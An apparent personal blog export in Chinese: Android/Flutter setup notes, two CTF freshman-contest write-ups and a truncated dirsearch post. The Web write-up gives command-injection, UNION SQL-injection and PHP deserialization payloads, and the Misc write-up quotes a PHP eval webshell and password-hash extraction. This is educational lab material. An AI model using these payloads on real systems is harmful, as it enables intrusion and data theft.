[{"title":"Android Studio连接夜神模拟器","url":"/2022/01/12/android-studio-lian-jie-ye-shen-mo-ni-qi/","content":"Android Studio连接夜神模拟器本来在安卓开发时一直使用的都是as自带的qemu模拟器，方便倒是方便，但奈何性能实在是太低，而且对内存的占用简直恐怖，最后还是选择了使用Nox模拟器，孰优孰劣，看图便知\n\n在自己连接as的时候遇见了一堆坑，摸索半天算是解决了，以下是99%成功的连接流程：\n首先要下载国际版，不用国内版的原因懂得都懂\nhttps://res06.bignox.com/full/20211221/e258f0c48f544f3c92e68f88cbfbdc86.exe?filename=nox_setup_v7.0.2.0_full_intl.exe\n下载安装之后，需要更改两个文件，版本不同的化没有办法进行调试\n打开D:\\Nox\\bin文件夹，可以看见里面有一个 adb.exe和nox_adb.exe两个文件，这两个实际上是同一个文件，在CMD中打开该文件夹输入以下命令，可以查看这两个adb的版本\nadb versionnox_adb version\n\n而Android Studio所使用的adb一般在这个路径.....\\Android\\Sdk\\platform-tools，继续使用命令查看版本\nadb version\n\n一般这两个的版本号是不同的，as的adb一般版本号高一些，将as的adb.exe直接复制过去，覆盖原来的adb.exe，并且再复制一个，重命名为nox_adb.exe，覆盖原来的nox_adb.exe.这样就能愉快的连接并调试了。\n在连接的时候使用的命令是\nadb connect 127.0.0.1:62001\n补充：新版本的Android studio好像更改了端口，使用上面的命令会出现这样\n这样的话就更改端口\nadb connect 127.0.0.1:5037\n\n之后在as的device列表就能看到一个三星的机子了（前提是你启动了Nox），那个就是夜神模拟器\n","categories":["Deployment"],"tags":["Learn","Flutter","Android"]},{"title":"Chive秋季新生赛Misc题解","url":"/2021/10/12/chive-qiu-ji-xin-sheng-sai-misc-ti-jie/","content":"Misc题解前置知识本wp是面向新生写的，题不难方法乱，佬佬佬请手下留情qwq1.必要的软件：010editor或者Winhex（十六进制分析），StegSolve（图片处理），wireshark（流量分析），QRc，ARCHPR，netcat等\nkali系统：volatility（内存取证），pwntools（pwn必备）\n2.一些前置知识\n①本次题目用到的文件头：\n504B0304    zip格式\nFFD8    jpg格式\n更多格式自己百度（\n②简单的linux操作，虚拟机，命令行等基础知识\n签到题题目提示“s2n”，实际上就是告诉你字符串转数字，将题目上的十进制数字转为16进制，然后在转化为字符串就是flag\n在线网站：https://www.zixuephp.net/tool-str-hex.html\n当然也可以用python的libnum库的libnum.n2s\n198974677777466123233790739058702135422422941323011746768369887102728114188076830963581666c61677b57656c63306d655f546f5f7468655f6374665f7730726c645f33656438377dflag&#123;Welc0me_To_the_ctf_w0rld_3ed87&#125;\n\n海报的秘密用PS将右上角的定位符补全，不要使用手机直接扫码，用QRC等软件扫码，可以看出在QQ的跳转链接的后面加上了一段flag\nMetadataMetadata就是元数据的意思，简单理解就是图片的备注信息，用010editor打开（以下简称010），可以看到在压缩包最后有一些base64编码\n\n将这个图片用在线网站提取exif信息，然后可以发现另一段base64编码\n\n复制之后解码，就能得到flag\n\nhttps://exif.tuchong.com/   在线提取exif信息\nhttp://www.hiencode.com    各种解码大合集\nGrass在GitHub上面搜索“Grass-plant Programming Language”，找到那个项目就行，在Result里面有编译好的解释器，按要求使用就行\nhttps://github.com/nanayaT/GllEditor 项目地址\nezpcap打开流量包，可以看到一堆没用的ARP流量，直接过滤（高人指点，校园网的锅）\n\n然后用指令过滤，打开流量包就能找到flag\n\nHeight_and_width一眼可以看出图片的高度和宽度北部修改了，那么如何才能找到原来的宽高值呢？这就要看png的文件格式了\n（注：这些信息是我凭记忆写的，可能有些错误，请以实际为准）\nPNG文件中总是以固定的八个字节开头：89 50 4E 47 0D 0A 1A 0A\n数据块长度13：00 00 00 0D\n文件头数据块标示IDCH：49 48 44 52\n13位数据块（IHDR）：宽和高： 00 00 00 80 00 00 00 80 之后5个字节依次为Bit depth ColorType Compression method Filter method Interlace method    ：08 02 00 00 00\n接下来的四字节为该png图片的CRC校验码，由IDCH和IHDR共十七位字节进行crc计算得到。\n74 0F 90 AC\n对于png图片的高度和宽度有一个CRC32值校验，于是便可以通过CRC32碰撞来获得原来的宽度高度，脚本如下：\nimport osimport binasciiimport structcrcbp = open(&quot;C:\\\\Users\\\\LiangMaxwell\\\\Downloads\\\\QRCode.png&quot;,&quot;rb&quot;).read()for i in range(1024):\tfor j in range(1024):\t\tdata = crcbp[12:16] + struct.pack(&#x27;&gt;i&#x27;,i) + struct.pack(&#x27;&gt;i&#x27;,j) + crcbp[24:29]\t\tcrc32 = binascii.crc32(data) &amp; 0xffffffff\t\tif crc32 == 0x740f90ac:\t\t\tprint i,j\t\t\tprint &quot;hex&quot;,hex(i),hex(j)\n\n得到原来的图片宽高，在16进制中修改即可得到flag\nRGB_channel下载解压后得到三个图片，按照名称用StegSolve打开，分别提取RGB三个通道的信息，连接起来就是flag\n\n\n\n提取完之后注意删掉空格，我特么删了两个空格没看见第一个然后死活提交不对，我是铸币。\nBase163264看题目就可以知道是base16 base32 base64三种编码方式，由于文本长度过长，很难通过在线网站进行解码，所以需要python脚本\nimport base64readfile = open(&#x27;C:\\\\Users\\\\LiangMaxwell\\\\Downloads\\\\24.txt&#x27;,&#x27;r&#x27;)f=open(&quot;C:\\\\Users\\\\LiangMaxwell\\\\Downloads\\\\25.txt&quot;,&quot;wb&quot;)txt = readfile.readlines()[0]txt = base64.b16decode(txt)print(txt)f.write(txt)readfile.close()\n\nimport base64readfile = open(&#x27;C:\\\\Users\\\\LiangMaxwell\\\\Downloads\\\\19.txt&#x27;,&#x27;r&#x27;)f=open(&quot;C:\\\\Users\\\\LiangMaxwell\\\\Downloads\\\\20.txt&quot;,&quot;wb&quot;)txt = readfile.readlines()[0]txt = base64.b32decode(txt)print(txt)f.write(txt)readfile.close()\n\nimport base64readfile = open(&#x27;C:\\\\Users\\\\LiangMaxwell\\\\Downloads\\\\17.txt&#x27;,&#x27;r&#x27;)f=open(&quot;C:\\\\Users\\\\LiangMaxwell\\\\Downloads\\\\18.txt&quot;,&quot;wb&quot;)txt = readfile.readlines()[0]txt = base64.b64decode(txt)print(txt)f.write(txt)readfile.close()\n\n鄙人不才，使用的麻烦的解题方法：\n（上面的代码都能看懂吧）\nbase16格式：31313435313431393139383130E593BCE593BCE5958AE5958AE5958AE5958A0A\nbase32格式：GEYTINJRGQYTSMJZHAYTBZMTXTSZHPHFSWFOLFMK4WKYVZMVRIFA&#x3D;&#x3D;&#x3D;&#x3D;\nbase64格式：MTE0NTE0MTkxOTgxMOWTvOWTvOWViuWViuWViuWVigo&#x3D;\n通过观察解码出来的格式，选择使用哪一个脚本来解码，在pycharm里面选择不同的脚本来运行，每次运行之后更改一下文件路径，知道最后算出来flag\n标准解法：用个异常处理来同时转换编码，当初没想到（\n也许可以写一个正则表达式来判断是何种编码，但是过于懒惰不想思考（\nwhat’s_my_password内存分析题，需要在kali中安装脚本以及相关依赖\n查看相关信息\nvolatility -f mem.raw imageinfo\n\n查看账户密码\nvolatility -f mem.raw --profile=Win70x86 hashdump\n\n(注意，上面那个Win70x86是其他的内存镜像的信息，对于本题需要用第一个命令看一下详细信息，然后改成自己的)\n在“CTF”账户中可以找到SAM的信息，然后在下面这个网站就能解析出原来的密码\nhttps://www.objectif-securite.ch/ophcrack\n简单流量分析（被出题人气晕.jpg）\n打开之后，常规过滤流量，得到想要的http流量信息\n\n提取出来文件\n\n在这些文件中就能找到我们想要的信息\n\n\n\n最后按照要求写出来就是\n1. 黑客上传的一句话木马是什么?&lt;?php eval($_POST[&#x27;antswordisgood&#x27;]); ?&gt;2. 黑客利用一句话木马getshell需要的密码是什么?antswordisgood3. 黑客从服务器获取的文件的内容是什么?This_is_a_secret_file_lol回答上述问题, 并将上述问题的答案用&quot;_&quot;(下划线)连接起来, 如&quot;一句话木马_密码_文件内容&quot;, 再将连接的字符串用32位小写md5加密, 并以flag&#123;xxx&#125;的形式提交, xxx为小写32位md5\n\n注意事项，”一句话木马“指的是40字节的文件内容，而不是”shell.php“,然后secret.txt显示的是26字节，实际上只要25个字符，原因是出题人多打了一个回车，于是答案就是\n&lt;?php eval($_POST[&#x27;antswordisgood&#x27;]); ?&gt;_antswordisgood_This_is_a_secret_file_lol\n\nmd5之后就是flag的内容\n究极套娃典中典\n首先直接打开流量包，发现提示损坏，用16进制打开可以看到后面多了一个压缩包和几个字符，注意那几个字符实际上就是flag2（亏我当初一顿好找）\n\n将后缀的压缩包分离出来，解压密码是流量包分析的结果，流量包本身是一个键盘流量，通过指令和脚本可以分析出来解压密码\n（对于键盘流量分析和解码脚本请自行百度，我在另一个电脑上面写的wp没有相关软件和脚本qwq）\n\n解压出来之后进入challenge2，里面有一个图片，无法打开，缺少文件头，补上去就行\n这个图片藏满了信息，首先是高度，将其修改之后可以看到密码3\n\n然后是Exif信息，同样可以用在线网站提取出来密码1\n\n用16进制打开之后可以看到后面还有一个压缩包，提取出来之后是密码2\n\n将密码链接起来解压压缩包，进入challenge3\n对于那三个rgb图片，都使用StegSolve提取数据，可以看出里面都是压缩包\n\n这三个压缩包里面都是一个5字节的txt，通过解题经验可知这是CRC32碰撞，上脚本\n（GitHub上面也有著名的项目https://github.com/theonlypwner/crc32）\n这是那三个文件的CRC32值\n88e29b0b   a7d5ecec   009067d5\n# coding:utf-8&quot;&quot;&quot;Author：spaceman&quot;&quot;&quot;import binasciiimport stringfrom time import sleepdef is_number(s):    try:        float(s)        return True    except ValueError:        pass    try:        import unicodedata        unicodedata.numeric(s)        return True    except (TypeError, ValueError):        pass    return False# 进度条def progress(percent=0, width=40):    left = width * percent // 95    right = width - left    print(&#x27;\\r[&#x27;, &#x27;#&#x27; * left, &#x27; &#x27; * right, &#x27;]&#x27;, f&#x27; &#123;percent:.0f&#125;%&#x27;, sep=&#x27;&#x27;, end=&#x27;&#x27;, flush=True)# 一位字节def crc1(strs, dic):    strs = hex(int(strs, 16))    rs = &#x27;&#x27;    for i in dic:        s = i        if hex(binascii.crc32(s.encode())) == strs:            rs += s            print(strs + &#x27;  ： &#x27; + s)    return rs# 两位字节def crc2(strs, dic):    strs = hex(int(strs, 16))    rs = &#x27;&#x27;    for i in dic:        for j in dic:            s = i + j            if hex(binascii.crc32(s.encode())) == strs:                rs += s                print(strs + &#x27;  ： &#x27; + s)    return rs# 三位字节def crc3(strs, dic):    strs = hex(int(strs, 16))    rs = &#x27;&#x27;    for i in dic:        for j in dic:            for k in dic:                s = i + j + k                if hex(binascii.crc32(s.encode())) == strs:                    rs += s                    print(strs + &#x27;  ： &#x27; + s)    return rs# 四位字节def crc4(strs, dic):    strs = hex(int(strs, 16))    rs = &#x27;&#x27;    it = 1    for i in dic:        for j in dic:            for k in dic:                for m in dic:                    s = i + j + k + m                    if hex(binascii.crc32(s.encode())) == strs:                        rs += s                        print()                        print(strs + &#x27;  ： &#x27; + s)                        print(&#x27;\\n&#x27;)        progress(it)        sleep(0.1)        it += 1    return rs# 五位字节def crc5(strs, dic):    strs = hex(int(strs, 16))    rs = &#x27;&#x27;    it = 1    for i in dic:        progress(it)        for j in dic:            for k in dic:                for m in dic:                    for n in dic:                        s = i + j + k + m + n                        if hex(binascii.crc32(s.encode())) == strs:                            rs += s                            print()                            print(strs + &#x27;  ： &#x27; + s)                            print(&#x27;\\n&#x27;)        sleep(0.1)        it += 1    return rs# 计算碰撞 crcdef CrackCrc(crclist, length):    print()    print(&quot;正在计算...&quot;)    print()    dic = &#x27;&#x27;&#x27; !&quot;#$%&amp;&#x27;()*+,-./0123456789:;&lt;=&gt;?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\\\]^_`abcdefghijklmnopqrstuvwxyz&#123;|&#125;~&#x27;&#x27;&#x27;  # 碰撞需要的字符字典    dic = dic[::-1]    text = &#x27;&#x27;    for i in crclist:        if length == &#x27;1&#x27;:            text += crc1(i, dic)        if length == &#x27;2&#x27;:            text += crc2(i, dic)        if length == &#x27;3&#x27;:            text += crc3(i, dic)        if length == &#x27;4&#x27;:            text += crc4(i, dic)        if length == &#x27;5&#x27;:            text += crc5(i, dic)    print(&#x27;\\n&#x27;)    if text == &#x27;&#x27;:        print(&quot;碰撞失败,无结果&quot;)        exit()    print(&quot;字符顺序组合：&quot;, end=&#x27; &#x27;)    print()    print(text)    print()    input(&quot;回车确认结束程序...&quot;)# 主函数print(&#x27;&#x27;&#x27;#################################### Author：spaceman ######### Thank you for your use #################################&#x27;&#x27;&#x27;)listcrc = []  # 用于存储crc值length = (input(&quot;请输入文本字节大小(1-5)：&quot;))  # 即文本内容大小，如文本内容为flag，大小即为4if is_number(length) == False or length not in (&quot;1,2,3,4,5&quot;):    exit(&quot;非指定数字，退出&quot;)print()while 1:    crc = input(&#x27;请输入crc值(例如:d1f4eb9a,输入n完成输入):&#x27;)    if crc == &#x27;n&#x27;:        break    crc = &#x27;0x&#x27; + crc    if len(crc) != 10:        print(&quot;rcr长度不对,请重新输入&quot;)        continue    listcrc.append(crc)CrackCrc(listcrc, length)\n\n最后可以碰撞出来一些字符串\n0x88e29b0b  ： v6tKj0x88e29b0b  ： jy(J~0x88e29b0b  ： Whd&quot;&amp;0x88e29b0b  ： K&#x27;8#20xa7d5ecec  ： ^7U1q0xa7d5ecec  ： 2Dx550x9067d5  ： kxKUe0x9067d5  ： J&amp;[&lt;)0x9067d5  ： &amp;Uv8m\n\n将其组合成字典，使用ARCHPR爆破就能得到密码\nv6tKj^7U1qkxKUev6tKjkxKUe^7U1q^7U1qv6tKjkxKUe^7U1qkxKUev6tKjkxKUe^7U1qv6tKjkxKUev6tKj^7U1qv6tKj^7U1qJ&amp;[&lt;)v6tKjJ&amp;[&lt;)^7U1q^7U1qv6tKjJ&amp;[&lt;)^7U1qJ&amp;[&lt;)v6tKjJ&amp;[&lt;)^7U1qv6tKjJ&amp;[&lt;)v6tKj^7U1qv6tKj^7U1q&amp;Uv8mv6tKj&amp;Uv8m^7U1q^7U1qv6tKj&amp;Uv8m^7U1q&amp;Uv8mv6tKj&amp;Uv8m^7U1qv6tKj&amp;Uv8mv6tKj^7U1qv6tKj2Dx55kxKUev6tKjkxKUe2Dx552Dx55v6tKjkxKUe2Dx55kxKUev6tKjkxKUe2Dx55v6tKjkxKUev6tKj2Dx55v6tKj2Dx55J&amp;[&lt;)v6tKjJ&amp;[&lt;)2Dx552Dx55v6tKjJ&amp;[&lt;)2Dx55J&amp;[&lt;)v6tKjJ&amp;[&lt;)2Dx55v6tKjJ&amp;[&lt;)v6tKj2Dx55v6tKj2Dx55&amp;Uv8mv6tKj&amp;Uv8m2Dx552Dx55v6tKj&amp;Uv8m2Dx55&amp;Uv8mv6tKj&amp;Uv8m2Dx55v6tKj&amp;Uv8mv6tKj2Dx55jy(J~^7U1qkxKUejy(J~kxKUe^7U1q^7U1qjy(J~kxKUe^7U1qkxKUejy(J~kxKUe^7U1qjy(J~kxKUejy(J~^7U1qjy(J~^7U1qJ&amp;[&lt;)jy(J~J&amp;[&lt;)^7U1q^7U1qjy(J~J&amp;[&lt;)^7U1qJ&amp;[&lt;)jy(J~J&amp;[&lt;)^7U1qjy(J~J&amp;[&lt;)jy(J~^7U1qjy(J~^7U1q&amp;Uv8mjy(J~&amp;Uv8m^7U1q^7U1qjy(J~&amp;Uv8m^7U1q&amp;Uv8mjy(J~&amp;Uv8m^7U1qjy(J~&amp;Uv8mjy(J~^7U1qjy(J~2Dx55kxKUejy(J~kxKUe2Dx552Dx55jy(J~kxKUe2Dx55kxKUejy(J~kxKUe2Dx55jy(J~kxKUejy(J~2Dx55jy(J~2Dx55J&amp;[&lt;)jy(J~J&amp;[&lt;)2Dx552Dx55jy(J~J&amp;[&lt;)2Dx55J&amp;[&lt;)jy(J~J&amp;[&lt;)2Dx55jy(J~J&amp;[&lt;)jy(J~2Dx55jy(J~2Dx55&amp;Uv8mjy(J~&amp;Uv8m2Dx552Dx55jy(J~&amp;Uv8m2Dx55&amp;Uv8mjy(J~&amp;Uv8m2Dx55jy(J~&amp;Uv8mjy(J~2Dx55Whd&quot;&amp;^7U1qkxKUeWhd&quot;&amp;kxKUe^7U1q^7U1qWhd&quot;&amp;kxKUe^7U1qkxKUeWhd&quot;&amp;kxKUe^7U1qWhd&quot;&amp;kxKUeWhd&quot;&amp;^7U1qWhd&quot;&amp;^7U1qJ&amp;[&lt;)Whd&quot;&amp;J&amp;[&lt;)^7U1q^7U1qWhd&quot;&amp;J&amp;[&lt;)^7U1qJ&amp;[&lt;)Whd&quot;&amp;J&amp;[&lt;)^7U1qWhd&quot;&amp;J&amp;[&lt;)Whd&quot;&amp;^7U1qWhd&quot;&amp;^7U1q&amp;Uv8mWhd&quot;&amp;&amp;Uv8m^7U1q^7U1qWhd&quot;&amp;&amp;Uv8m^7U1q&amp;Uv8mWhd&quot;&amp;&amp;Uv8m^7U1qWhd&quot;&amp;&amp;Uv8mWhd&quot;&amp;^7U1qWhd&quot;&amp;2Dx55kxKUeWhd&quot;&amp;kxKUe2Dx552Dx55Whd&quot;&amp;kxKUe2Dx55kxKUeWhd&quot;&amp;kxKUe2Dx55Whd&quot;&amp;kxKUeWhd&quot;&amp;2Dx55Whd&quot;&amp;2Dx55J&amp;[&lt;)Whd&quot;&amp;J&amp;[&lt;)2Dx552Dx55Whd&quot;&amp;J&amp;[&lt;)2Dx55J&amp;[&lt;)Whd&quot;&amp;J&amp;[&lt;)2Dx55Whd&quot;&amp;J&amp;[&lt;)Whd&quot;&amp;2Dx55Whd&quot;&amp;2Dx55&amp;Uv8mWhd&quot;&amp;&amp;Uv8m2Dx552Dx55Whd&quot;&amp;&amp;Uv8m2Dx55&amp;Uv8mWhd&quot;&amp;&amp;Uv8m2Dx55Whd&quot;&amp;&amp;Uv8mWhd&quot;&amp;2Dx55K&#x27;8#2^7U1qkxKUeK&#x27;8#2kxKUe^7U1q^7U1qK&#x27;8#2kxKUe^7U1qkxKUeK&#x27;8#2kxKUe^7U1qK&#x27;8#2kxKUeK&#x27;8#2^7U1qK&#x27;8#2^7U1qJ&amp;[&lt;)K&#x27;8#2J&amp;[&lt;)^7U1q^7U1qK&#x27;8#2J&amp;[&lt;)^7U1qJ&amp;[&lt;)K&#x27;8#2J&amp;[&lt;)^7U1qK&#x27;8#2J&amp;[&lt;)K&#x27;8#2^7U1qK&#x27;8#2^7U1q&amp;Uv8mK&#x27;8#2&amp;Uv8m^7U1q^7U1qK&#x27;8#2&amp;Uv8m^7U1q&amp;Uv8mK&#x27;8#2&amp;Uv8m^7U1qK&#x27;8#2&amp;Uv8mK&#x27;8#2^7U1qK&#x27;8#22Dx55kxKUeK&#x27;8#2kxKUe2Dx552Dx55K&#x27;8#2kxKUe2Dx55kxKUeK&#x27;8#2kxKUe2Dx55K&#x27;8#2kxKUeK&#x27;8#22Dx55K&#x27;8#22Dx55J&amp;[&lt;)K&#x27;8#2J&amp;[&lt;)2Dx552Dx55K&#x27;8#2J&amp;[&lt;)2Dx55J&amp;[&lt;)K&#x27;8#2J&amp;[&lt;)2Dx55K&#x27;8#2J&amp;[&lt;)K&#x27;8#22Dx55K&#x27;8#22Dx55&amp;Uv8mK&#x27;8#2&amp;Uv8m2Dx552Dx55K&#x27;8#2&amp;Uv8m2Dx55&amp;Uv8mK&#x27;8#2&amp;Uv8m2Dx55K&#x27;8#2&amp;Uv8mK&#x27;8#22Dx55这个文件的口令 : v6tKj2Dx55kxKUe\n\n解压challenge4，得到flag1，将其与之前的flag2拼接就能得到flag\nflag&#123;W0w_yoU_4re_m1Sc_Ma5Ter_BuT_Ju5t_4_j0ke_LoL&#125;\n\n总结题不算难，考察的知识点很全面，对纯萌新不太友好（\n对于没有基础的新生来说，如果善于使用Google，百度，CSDN等搜索工具，就能很快的解决问题\n","categories":["WriteUp"],"tags":["CTF","Misc","Chive"]},{"title":"Flutter开发中遇到的小bug记录","url":"/2022/02/12/flutter-bug/","content":"Flutter开发中遇到的小bug记录在Flutter开发中，见到了无数让人流汗的小bug😅，于是用这个记录一下各种各样的毛病\n\nRunning Gradle task ‘assembleDebug’… 时间过长典中典，GFW的影响\n需要把build.gradle修改成这个\nrepositories &#123;    // 这里注释掉了原来的仓库，使用国内的阿里镜像源    // google()    // jcenter()    maven &#123; url &#x27;https://maven.aliyun.com/repository/google&#x27; &#125;    maven &#123; url &#x27;https://maven.aliyun.com/repository/jcenter&#x27; &#125;    maven &#123; url &#x27;http://maven.aliyun.com/nexus/content/groups/public&#x27; &#125;&#125;\n\n\n\nWaiting for another flutter command to release the startup lock一种解决方法是这样：\n\n关闭Android Studio\n\n打开flutter安装目录&#x2F;bin&#x2F;cache\n\n删除lockfile文件\n\n此时可在命令行再执行flutter相关命令，完美解决\nPS:但是一些情况下可能没用，那就结束dart任务\n#On Linuxkillall -9 dart#On Windows taskkill /F /IM dart.exe\n\n\nerror: The named parameter ‘colors’ isn’t defined.非常神奇的脑弹bug，不影响编译，但是会报dart错误，还会飘红，需要重启一下IDE\n\nThe named parameter ‘vsync‘ isn‘t defined同上，重启IDE包治百病\n\n输入框弹出挤压空间Scaffold(\tresizeToAvoidBottomPadding: false, //输入框抵住键盘)\n\nAndroid studio初次creating flutter project长时间卡死运行\nflutter doctor\n\n一般在这种情况下会告诉你没有安装Androifd Licenses\n运行\nflutter doctor --android-licenses\n\n某些情况下因为GFW的影响还得更改一下地址环境变量，不过我没有遇见过这问题就不赘述了\n\n未完待续\n\n\n","categories":["Deployment"],"tags":["Learn","Flutter","Android"]},{"title":"Chive秋季新生赛web题解","url":"/2021/10/14/chive-qiu-ji-xin-sheng-sai-web/","content":"WEB题解WEB签到&lt;?phphighlight_file(__FILE__);@error_reporting(0);$a=$_GET[&#x27;a&#x27;];if(strlen($a)!=3||$a==&#x27;cat&#x27;)&#123;    die(&quot;no way&quot;);&#125;else&#123;    $cmd=$a.&quot; ./flag.php&quot;;    system($cmd);&#125;?&gt;\n\n看代码可知，是一道简单的命令注入，命令不能是cat，长度还得是3，于是就可以使用命令tac来读取flag\nGET传参 ,URl后面加上  &#x2F;?a&#x3D;tac   即可\n图灵测试BurpSuite的简单应用\n1.首先是GET传参    ?VaalaCat&#x3D;yyds 刷新\n2.然后在Burp的请求拦截中，发送给Repeater，修改请求方法为POST 在最后加上 Niebelungen&#x3D;yyds，同时添加参数 Content-Type: application&#x2F;x-www-form-urlencoded\n3.仍然在Repeater中，修改Cookie: name&#x3D;7att1ce\n4.在User-Agent:下面添加一行 X-Forwarded-For:255.256.257.258\n5.再在下面添加一行 Referer:https://space.bilibili.com/199118139\n上述操作执行完之后就能过关，完整的HTTP请求头如图所示\n提示flag在fl4g1sH3r3.php中，访问这个地址，用burp拦截，发送给Repeater，在右边的HTTP相应中可以找到flag\nWebmisc直接dirsearch扫盘，发现隐藏的备份文件\npython3 dirsearch.py -u http://0a1550e9-ca05-4563-be82-9ed6fbc59a83.node.vaala.ink/\n\n\n下载下来备份文件后，发现是个套娃压缩包，文件名作为解压密码，直接上脚本\nimport zipfiledir = &quot;C:\\\\Users\\\\LiangMaxwell\\\\Downloads\\\\backup\\\\&quot;n = 0s2 = &quot;&quot;def jieya():    i = &quot;22531.zip&quot;    for x in range(10000):        ss = i[:i.find(&quot;.&quot;)]        print(i)        password  = ss        zpf = zipfile.ZipFile(dir + ss + &quot;.zip&quot;)        list = zpf.namelist()        for f in list:            zpf.extract(f, dir, password.encode(&#x27;utf-8&#x27;))        print(ss + &quot; success &quot; + str(f))        i = str(f)jieya()\n\n轻松得到flag\n华强买瓜首先还是dirsearch扫盘，发现&#x2F;.git&#x2F;泄露\n\n使用神器GitHack，将git文件下载下来\n\n然后在下载下来的文件夹中使用git，用git log查看历史版本\n\n利用git reset --hard id回到之前的版本\n小知识，在git bash 中： 复制： CTRL+INSERT 粘贴： SHIFT+INSERT\n然后用Vi还原打开.hint.swp，可以看到提示，flag被藏到了一个图片里gua@@@@.png，其中@@@@是四个阿拉伯数字，直接上Burp进行爆破，可以在http相应中发现gua8848.png有长响应，访问即可看见flag\n\n十月新番导视点进去看啥也没有，扫盘也扫不出来，查看源码时发现一个隐藏的地址\n\n访问之后如下图所示\n\n注意到有个?id=，可以看出来这个是一道SQL注入题，稍加测试就可以发现屏蔽了空格和一些关键词，但可以大小写绕过和注释绕过\npayload如下所示\n1/**/order/**/by/**/3#3无结果，说明主select有两个变量-1/**/Union/**/Select/**/1,/**/database()#得到数据库为bangumi-1/**/Union/**/Select/**/1,/**/Group_concat(table_name)/**/From/**/information_schema.tables/**/Where/**/table_schema/**/=/**/&#x27;bangumi&#x27;#得到bangumi_secret,october两个表-1/**/Union/**/Select/**/1,/**/Group_concat(column_name)/**/From/**/information_schema.columns/**/Where/**/table_name/**/=/**/&#x27;bangumi_secret&#x27;#发现flag-1/**/Union/**/Select/**/1,/**/flag/**/From/**/bangumi_secret#读取到flag\n\n\n\nEasy UnSerialize先看源代码Fifth Space &lt;?phpclass Read &#123;    public function read()&#123;        echo file_get_contents(&quot;flag.php&quot;);    &#125;    public function __invoke()&#123;        $this-&gt;read();    &#125;&#125;class Show&#123;    public $source;    public $fuck;    public $str;    public function __construct($file=&#x27;index.php&#x27;)&#123;        $this-&gt;source = $file;        echo &#x27;Welcome to &#x27;.$this-&gt;source.&quot;&lt;br&gt;&quot;;    &#125;    public function __toString()&#123;        return $this-&gt;str-&gt;source;    &#125;    public function __wakeup()&#123;        if(preg_match(&quot;/gopher|http|file|ftp|https|dict|\\.\\./i&quot;, $this-&gt;source)) &#123;            echo &quot;hacker&quot;;            $this-&gt;source = &quot;index.php&quot;;        &#125;    &#125;&#125;class Test&#123;    public $p;    public function __construct()&#123;        $this-&gt;p = array();    &#125;    public function __get($key)&#123;        $function = $this-&gt;p;        return $function();    &#125;&#125;if(isset($_GET[&#x27;chain&#x27;]))&#123;    @unserialize($_GET[&#x27;chain&#x27;]);&#125;else&#123;    echo &quot;Fifth Space&quot;;    highlight_file(__FILE__);&#125;?&gt;\n\n\n首先第一个Read类\nclass Read &#123;    public function read()&#123;        echo file_get_contents(&quot;flag.php&quot;);    &#125;    public function __invoke()&#123;        $this-&gt;read();    &#125;&#125;\n\n\n可以读取flag，而且这里有魔法方法__invoke 当脚本尝试将对象调用为函数时会触发，所以在脚本中，我们要尽量把Read类调用为函数，来触发LFI\nShow类\nclass Show&#123;    public $source;    public $fuck;    public $str;    public function __construct($file=&#x27;index.php&#x27;)&#123;        $this-&gt;source = $file;        echo &#x27;Welcome to &#x27;.$this-&gt;source.&quot;&lt;br&gt;&quot;;    &#125;    public function __toString()&#123;        return $this-&gt;str-&gt;source;    &#125;    public function __wakeup()&#123;        if(preg_match(&quot;/gopher|http|file|ftp|https|dict|\\.\\./i&quot;, $this-&gt;source)) &#123;            echo &quot;hacker&quot;;            $this-&gt;source = &quot;index.php&quot;;        &#125;    &#125;&#125;\n\n首先是wakeup当中禁用了一些协议，但是很明显没有禁用filter协议，之后看到这里有两个魔法方法：\n_toString 把类当作字符串使用时触发,当然需要与echo方法进行配合使用\n _wakeup 使用反序列化函数时触发\nTest类\nclass Test&#123;    public $p;    public function __construct()&#123;        $this-&gt;p = array();    &#125;    public function __get($key)&#123;        $function = $this-&gt;p;        return $function();    &#125;&#125;\n\n__get 从不可访问的属性中读取数据会触发会返回function作为函数调用。\n构造pop链我们可以先使用反序列化触发Show类中的wakeup方法，之后想办法触发__tostring方法，之后将str实例化为Test，因为Test类中不含source属性，所以调用get方法，在这个时候我们便可以把 Read类当作函数调用，从而达到效果之后便可运行以下php内容得到利用参数\n&lt;?phpclass Read &#123;    &#125;class Show&#123;    public $source;    public $str;\tpublic function __construct($file)&#123;    $this-&gt;source = $file;    &#125;    public function __toString()&#123;        return &quot;LiangMaxwell&quot;;    &#125;&#125;class Test&#123;    public $p;&#125;$a = new Show(&#x27;aaa&#x27;);$a-&gt;str = new Test();$a-&gt;str-&gt;p = new Read();$b = new Show($a);echo serialize($b);?&gt;\n\n得到\nO:4:&quot;Show&quot;:2:&#123;s:6:&quot;source&quot;;O:4:&quot;Show&quot;:2:&#123;s:6:&quot;source&quot;;s:3:&quot;aaa&quot;;s:3:&quot;str&quot;;O:4:&quot;Test&quot;:1:&#123;s:1:&quot;p&quot;;O:4:&quot;Read&quot;:0:&#123;&#125;&#125;&#125;s:3:&quot;str&quot;;N;&#125;\n\nGET传参\nchain=O:4:&quot;Show&quot;:2:&#123;s:6:&quot;source&quot;;O:4:&quot;Show&quot;:2:&#123;s:6:&quot;source&quot;;s:3:&quot;aaa&quot;;s:3:&quot;str&quot;;O:4:&quot;Test&quot;:1:&#123;s:1:&quot;p&quot;;O:4:&quot;Read&quot;:0:&#123;&#125;&#125;&#125;s:3:&quot;str&quot;;N;&#125;\n\n但是页面一片空白，这时候按下神奇的F12就能看到flag\n\n（我至少将这个正确的payload提交了20次，都没想到在F12中藏一个flag，烂完了）\n","categories":["WriteUp"],"tags":["CTF","Chive","Web","PHP"]},{"title":"dirsearch扫描速度慢的bug修复","url":"/2023/03/26/dirsearch-sao-miao-su-du-man-de-bug-xiu-fu/","content":"dirsearch扫描速度慢的bug修复dirsearch这个目录扫描工具基本上渗透测试中必备的工具之一了，不过前些天在新装的虚拟机里面直接git clone了整个代码仓库，在进行测试的时候发现扫描速度不能说稍有逊色吧，也可以说是聊胜于无，但是当时以为是可歌可泣的校园网的锅，就没有想太多，直到今天在本机上下载了最新版，还是运行的极其缓慢，而且不是网络的问题\n爆破速度大概是  3&#x2F;s  基本上没超过 